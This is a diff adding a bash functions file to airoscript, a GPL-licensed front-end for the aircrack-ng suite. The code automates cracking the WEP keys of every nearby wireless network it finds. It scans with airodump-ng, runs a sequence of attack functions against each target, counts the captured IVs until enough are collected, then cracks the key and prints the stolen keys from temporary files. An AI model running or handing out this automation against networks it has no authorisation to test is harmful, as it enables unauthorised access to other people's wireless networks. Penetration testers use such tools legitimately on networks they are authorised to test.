@@ -1,0 +1,104 @@
+#!/bin/bash
+# Autocrack functions file for airoscript.
+
+# Copyright (C) 2011 David Francos Cuartero
+#        This program is free software; you can redistribute it and/or
+#        modify it under the terms of the GNU General Public License
+#        as published by the Free Software Foundation; either version 2
+#        of the License, or (at your option) any later version.
+
+#        This program is distributed in the hope that it will be useful,
+#        but WITHOUT ANY WARRANTY; without even the implied warranty of
+#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#        GNU General Public License for more details.
+
+#        You should have received a copy of the GNU General Public License
+#        along with this program; if not, write to the Free Software
+#        Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
+
+doauto(){
+    F=0; export AUTO=1; export QUIET=1; export INTERACTIVE=0
+        menu_type "WEP" && choosescan && sleep $time_to_scan && killall -2 "airodump-ng" && sleep 2
+        echo " done"; sleep 1
+		if [ -e $DUMP_PATH/dump-01.csv ]; then
+    head -n $ap_array $DUMP_PATH/dump-01.csv &> $DUMP_PATH/dump-02.csv ; $clear
+        ap_array=`cat $DUMP_PATH/dump-01.csv | grep -a -n Station | awk -F : '{print $1}'`
+    [[ "$filter_ssid" != "" ]] && { echo "$mark Filtering essid to $filter_ssid"; command grep $filter_ssid $DUMP_PATH/dump-02.csv > $DUMP_PATH/dump-03.csv ; } || { cp $DUMP_PATH/dump-02.csv $DUMP_PATH/dump-03.csv;  }
+	    while IFS=, read MAC; do i=$(( $i + 1 )) ; done < $DUMP_PATH/dump-03.csv
+        sleep 1
+        MAX_TARGETS=$i
+            echo "$mark Networks detected $MAX_TARGETS"; sleep 1
+            for i in `seq 1 $MAX_TARGETS`; do
+                echo "Trying to crack target: $i"
+    			AUTO=1; selectAp;  sleep 1
+                if [ "$Host_SSID" != "" ]; then
+                    autopwn
+                else
+                    echo "$mark Couldn't find essid, next try"
+                fi
+            done
+        else $clear; echo -n $mark;  _ "ERROR: Could not autodetect access points, have you selected an interface?"; fi
+    cleanautovars
+
+    echo $mark "Cracked networks: "
+    for i in /tmp/tmp.*/*.key; do
+        echo "\t$mark $i : `cat $i`"
+    done
+}
+
+autopwn(){
+    check_function cleanp || source $path/internal/childs
+    F=0; export AUTO=1; export QUIET=1; export INTERACTIVE=0; next=0;
+    sleep 1
+    count=0
+
+    for i in $attack_functions; do
+        echo "$mark Attack $count. Using $i in $Host_MAC"
+        $i & cleanp & get_current_ivs
+        echo "$mark Needed ivs: $min_ivs"
+
+        while [ "1" ]; do 
+            echo -en "\r$mark IVS: `check_all_ivs`"  ;
+            sleep 5 && { 
+                [[ "`check_all_ivs`" -gt "$min_ivs" ]] && { 
+                    echo; echo "$mark Trying to crack network, we have enough ivs";
+                    cleanautovars;
+                    auto autocrack;
+                    cleanautovars;
+                    reset; 
+                    echo "$mark Network cracked, password stored in $DUMP_PATH/$Host_MAC.key"; 
+                    read -n1 -p "Press enter to continue, q to exit and c to configure" foo; 
+                    [[ "$foo" == "c" ]] && configure; [[ "$foo" == "q" ]] && {
+                        check_function doexit || source $path/internal/exit
+                        doexit killme ; } 
+                } ;
+            }
+        done
+        count=$(( $count + 1 ))
+    done
+    cleanautovars
+    clear=$oldclear;
+}
+
+check_all_ivs(){
+    for i in $DUMP_PATH/$Host_MAC*.cap; do
+        cur=`ivstools --convert $i $DUMP_PATH/temporal|awk '/IVs/ {print $2}'`
+        if [ "$cur" = "" ]; then cur=0; fi
+        maxn=$(( $maxn + $cur ))
+    done
+    if [ "$maxn" == "" ]; then echo 0; fi
+    echo $maxn
+}
+
+get_current_ivs(){
+    auto return_ivs
+    [[ "$?" == 255 ]] && min_ivs=$autopwn_min_ivs || min_ivs=$?
+}
+
+check_if_worked(){
+    get_current_ivs
+    echo $'\t' "$mark Minium ivs required for this network: $min_ivs"
+    civs=`check_all_ivs`; echo $'\t' "$mark Current IVSs: $civs"
+    if [ "`check_all_ivs`" -gt $min_ivs ]; then echo $'\t' "$mark It worked, I have $min_ivs =)"; return 0; fi
+    return 1
+}
